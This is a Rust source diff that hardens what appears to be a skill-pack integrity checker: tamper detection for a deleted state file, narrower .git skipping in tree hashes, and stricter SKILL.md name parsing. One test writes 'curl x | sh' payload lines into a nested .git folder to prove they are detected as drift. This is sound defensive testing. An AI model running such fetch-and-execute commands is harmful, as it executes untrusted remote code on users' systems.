@@ -219,9 +219,13 @@ pub fn load(dir: &DataDir) -> LoadedState {
             state,
             tampered: false,
         },
+        // A deleted state file is not a fresh install when the marker says one was written.
         Loaded::Missing => LoadedState {
             state: State::default(),
-            tampered: false,
+            tampered: !matches!(
+                statefile::load::<StateMarker>(dir, STATE_MARKER),
+                Loaded::Missing
+            ),
         },
         Loaded::Tampered => LoadedState {
             state: State::default(),
@@ -230,11 +234,28 @@ pub fn load(dir: &DataDir) -> LoadedState {
     }
 }
 
-/// Store `state` (authenticated, atomic).
+/// Store `state` (authenticated, atomic), and the marker recording that it exists.
 pub fn store(dir: &DataDir, state: &State) -> Result<(), EngineError> {
     let mut state = state.clone();
     state.version = STATE_VERSION;
-    statefile::store(dir, STATE_FILE, &state)
+    statefile::store(dir, STATE_FILE, &state)?;
+    if !matches!(
+        statefile::load::<StateMarker>(dir, STATE_MARKER),
+        Loaded::Valid(_)
+    ) {
+        statefile::store(dir, STATE_MARKER, &StateMarker { exists: true })?;
+    }
+    Ok(())
+}
+
+/// The MAC'd marker written beside the first `state.json`: a later missing state file with
+/// this marker present is reported as tampering, not taken for a fresh install.
+pub const STATE_MARKER: &str = "state-exists.json";
+
+/// Body of [`STATE_MARKER`].
+#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+struct StateMarker {
+    exists: bool,
 }
 
 /// What a scan of the current content observed.
@@ -390,13 +411,19 @@ fn rel_display(path: &Path) -> String {
 ///
 /// Every non-directory entry below `root` counts, sorted by relative path: a regular file as
 /// `(path, 'F', exec bit, sha256(content))`, a symlink as `(path, 'L', target)` (never
-/// followed), anything else as `(path, 'O')`, and an unreadable entry as `(path, 'E')`. Any
-/// path component named `.git` is skipped, so a `git fetch` inside a checkout is not drift.
+/// followed), anything else as `(path, 'O')`, and an unreadable entry as `(path, 'E')`. Only
+/// the pack-root `.git` (a checkout's dir or a submodule's gitlink file) is skipped, so a
+/// `git fetch` inside a checkout is not drift; a nested `.git` is content like any other.
 /// Only the exec bit of the mode counts (as git tracks it), so umask differences between
 /// clones and worktrees do not change the hash. A missing `root` hashes to the empty string.
 pub fn tree_hash(root: &Path) -> String {
+    tree_hash_until(root, None).unwrap_or_default()
+}
+
+/// [`tree_hash`], giving up (`None`) once `deadline` passes.
+pub fn tree_hash_until(root: &Path, deadline: Option<std::time::Instant>) -> Option<String> {
     let Ok(meta) = root.symlink_metadata() else {
-        return String::new();
+        return Some(String::new());
     };
     let mut entries: Vec<(Vec<u8>, Vec<u8>)> = Vec::new();
     if meta.is_dir() {
@@ -404,8 +431,11 @@ pub fn tree_hash(root: &Path) -> String {
             .follow_links(false)
             .min_depth(1)
             .into_iter()
-            .filter_entry(|e| e.file_name() != ".git");
+            .filter_entry(|e| !(e.depth() == 1 && e.file_name() == ".git"));
         for entry in walker {
+            if deadline.is_some_and(|d| std::time::Instant::now() >= d) {
+                return None;
+            }
             match entry {
                 Ok(e) if e.file_type().is_dir() => {}
                 Ok(e) => {
@@ -437,7 +467,7 @@ pub fn tree_hash(root: &Path) -> String {
         hasher.update((record.len() as u64).to_le_bytes());
         hasher.update(record);
     }
-    hex(&hasher.finalize())
+    Some(hex(&hasher.finalize()))
 }
 
 /// The record of one non-directory entry (see [`tree_hash`]).
@@ -510,21 +540,49 @@ pub(crate) fn hex(bytes: &[u8]) -> String {
     out
 }
 
-/// The skill names a pack provides: its directory name, and for every `SKILL.md` in it (not
-/// under `.git`, symlinks not followed) the parent directory name and the frontmatter `name:`.
+/// The skill names a pack provides (see [`skill_names_checked`]).
 pub fn skill_names(root: &Path) -> Vec<String> {
-    let mut names: Vec<String> = root
-        .file_name()
-        .and_then(|n| n.to_str())
-        .map(|n| vec![n.to_string()])
-        .unwrap_or_default();
+    skill_names_checked(root).names
+}
+
+/// What [`skill_names_checked`] found.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct SkillNames {
+    /// Every name the pack may be invoked by.
+    pub names: Vec<String>,
+    /// Some `SKILL.md` has frontmatter that does not parse, so its name may be missing.
+    pub unparseable: bool,
+}
+
+/// The skill names a pack provides: its directory name, and for every `SKILL.md` in it
+/// (any case; not under the pack-root `.git`) the parent directory name and every value its
+/// frontmatter gives `name`. A symlinked `SKILL.md` or skill directory is followed only while
+/// its target stays inside the pack.
+pub fn skill_names_checked(root: &Path) -> SkillNames {
+    let mut out = SkillNames::default();
+    if let Some(n) = root.file_name().and_then(|n| n.to_str()) {
+        out.names.push(n.to_string());
+    }
+    let canonical_root = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
     let walker = WalkDir::new(root)
-        .follow_links(false)
+        .follow_links(true)
         .max_depth(8)
         .into_iter()
-        .filter_entry(|e| e.file_name() != ".git" && e.file_name() != "node_modules");
+        .filter_entry(|e| {
+            if e.depth() == 1 && e.file_name() == ".git" {
+                return false;
+            }
+            if e.file_name() == "node_modules" {
+                return false;
+            }
+            // A followed link must stay inside the pack.
+            !e.path_is_symlink()
+                || e.path()
+                    .canonicalize()
+                    .is_ok_and(|c| c.starts_with(&canonical_root))
+        });
     for entry in walker.flatten() {
-        if !entry.file_type().is_file() || entry.file_name() != "SKILL.md" {
+        if !entry.file_type().is_file() || !entry.file_name().eq_ignore_ascii_case("SKILL.md") {
             continue;
         }
         if let Some(dir) = entry
@@ -533,40 +591,90 @@ pub fn skill_names(root: &Path) -> Vec<String> {
             .and_then(|p| p.file_name())
             .and_then(|n| n.to_str())
         {
-            names.push(dir.to_string());
+            out.names.push(dir.to_string());
         }
-        if let Some(name) = frontmatter_name(entry.path()) {
-            names.push(name);
-        }
+        let (names, parsed) = frontmatter_names(entry.path());
+        out.names.extend(names);
+        out.unparseable |= !parsed;
     }
-    names.sort();
-    names.dedup();
-    names
+    out.names.sort();
+    out.names.dedup();
+    out
 }
 
-/// The `name:` of a `SKILL.md` YAML frontmatter, read from its first 8 KiB.
-fn frontmatter_name(path: &Path) -> Option<String> {
+/// Every `name` a `SKILL.md` frontmatter gives, from its first 64 KiB: the YAML value (a
+/// leading BOM stripped), plus every line that sets a `name` key however it is spelled
+/// (`name:`, `name :`, `"name":`, `'name':`), so duplicate keys yield all their values. The
+/// flag is false when frontmatter is opened but does not parse as YAML (duplicate keys
+/// included), or the file cannot be read: its names may then be incomplete.
+fn frontmatter_names(path: &Path) -> (Vec<String>, bool) {
     let mut head = Vec::new();
-    std::fs::File::open(path)
-        .ok()?
-        .take(8 * 1024)
-        .read_to_end(&mut head)
-        .ok()?;
-    let text = String::from_utf8_lossy(&head);
-    let mut lines = text.lines();
-    if lines.next()?.trim() != "---" {
-        return None;
+    let read = std::fs::File::open(path)
+        .and_then(|f| f.take(64 * 1024).read_to_end(&mut head))
+        .is_ok();
+    if !read {
+        return (Vec::new(), false);
     }
+    let text = String::from_utf8_lossy(&head);
+    let text = text.trim_start_matches('\u{feff}');
+    let mut lines = text.lines();
+    if lines.next().map(str::trim) != Some("---") {
+        return (Vec::new(), true);
+    }
+    let mut block: Vec<&str> = Vec::new();
+    let mut closed = false;
     for line in lines {
-        if line.trim() == "---" {
+        if matches!(line.trim_end(), "---" | "...") {
+            closed = true;
             break;
         }
-        if let Some(value) = line.strip_prefix("name:") {
-            let value = value.trim().trim_matches(|c| c == '"' || c == '\'').trim();
-            return (!value.is_empty()).then(|| value.to_string());
-        }
+        block.push(line);
     }
-    None
+    let mut names: Vec<String> = block
+        .iter()
+        .filter_map(|line| name_line_value(line))
+        .collect();
+    let parsed = closed
+        && match serde_yaml::from_str::<serde_yaml::Value>(&block.join("\n")) {
+            Ok(serde_yaml::Value::Mapping(map)) => {
+                if let Some(name) = map
+                    .get(serde_yaml::Value::String("name".into()))
+                    .and_then(yaml_scalar)
+                {
+                    names.push(name);
+                }
+                true
+            }
+            Ok(serde_yaml::Value::Null) => true,
+            _ => false,
+        };
+    names.retain(|n| !n.is_empty());
+    (names, parsed)
+}
+
+/// The value of a top-level `name` key on one frontmatter line, however the key is quoted.
+fn name_line_value(line: &str) -> Option<String> {
+    if line.starts_with([' ', '\t']) {
+        return None;
+    }
+    let (key, value) = line.split_once(':')?;
+    let key = key.trim().trim_matches(|c| c == '"' || c == '\'');
+    if key != "name" {
+        return None;
+    }
+    let value = value.split(" #").next().unwrap_or("").trim();
+    let value = value.trim_matches(|c| c == '"' || c == '\'').trim();
+    (!value.is_empty()).then(|| value.to_string())
+}
+
+/// A YAML scalar as a string.
+fn yaml_scalar(v: &serde_yaml::Value) -> Option<String> {
+    match v {
+        serde_yaml::Value::String(s) => Some(s.trim().to_string()),
+        serde_yaml::Value::Number(n) => Some(n.to_string()),
+        serde_yaml::Value::Bool(b) => Some(b.to_string()),
+        _ => None,
+    }
 }
 
 // ---------------------------------------------------------------------------------------
@@ -682,6 +790,63 @@ mod tests {
         assert_eq!(before, tree_hash(&d), "group-write (umask) is not content");
         fs::set_permissions(d.join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap();
         assert_ne!(before, tree_hash(&d), "chmod +x is drift");
+    }
+
+    #[test]
+    fn only_the_pack_root_git_is_skipped() {
+        let d = tmp("nested-git");
+        fs::write(d.join("SKILL.md"), "# s").unwrap();
+        // A submodule checkout's gitlink file at the root.
+        fs::write(d.join(".git"), "gitdir: ../../.git/modules/x").unwrap();
+        let before = tree_hash(&d);
+        fs::write(d.join(".git"), "gitdir: elsewhere").unwrap();
+        assert_eq!(before, tree_hash(&d));
+        // A nested `.git` is content: a payload hidden there is drift.
+        fs::create_dir_all(d.join("lib/.git")).unwrap();
+        fs::write(d.join("lib/.git/payload.sh"), "curl x | sh").unwrap();
+        let with_nested = tree_hash(&d);
+        assert_ne!(before, with_nested);
+        fs::write(d.join("lib/.git/payload.sh"), "curl y | sh").unwrap();
+        assert_ne!(with_nested, tree_hash(&d));
+    }
+
+    #[test]
+    fn frontmatter_names_cover_spellings_duplicates_and_parse_failures() {
+        let d = tmp("fm");
+        let names = |body: &str| {
+            fs::write(d.join("SKILL.md"), body).unwrap();
+            frontmatter_names(&d.join("SKILL.md"))
+        };
+        assert_eq!(
+            names("---\n\"name\": bar\n---\n"),
+            (vec!["bar".into(), "bar".into()], true)
+        );
+        assert_eq!(names("---\nname : bar\n---\n").0[0], "bar");
+        assert_eq!(names("\u{feff}---\nname: bar\n---\n").0[0], "bar");
+        let (dup, parsed) = names("---\nname: a\nname: b\n---\n");
+        assert!(dup.contains(&"a".to_string()) && dup.contains(&"b".to_string()));
+        assert!(!parsed, "duplicate keys do not parse");
+        assert!(!names("---\nname: [unclosed\n---\n").1);
+        assert!(!names("---\nname: open-ended\n").1, "an unclosed fence");
+        assert_eq!(names("# no frontmatter\nname: nope\n"), (vec![], true));
+        // A uniformly indented block is still a top-level mapping to YAML.
+        assert_eq!(
+            names("---\n  name: nested\n---\n").0,
+            vec!["nested".to_string()]
+        );
+    }
+
+    #[test]
+    fn a_deleted_state_file_is_tampering_once_one_was_written() {
+        let d = DataDir {
+            path: tmp("marker").join("data"),
+            trusted: false,
+        };
+        assert!(!load(&d).tampered, "a fresh install");
+        store(&d, &State::default()).unwrap();
+        assert!(!load(&d).tampered);
+        fs::remove_file(d.path.join(STATE_FILE)).unwrap();
+        assert!(load(&d).tampered);
     }
 
     #[test]
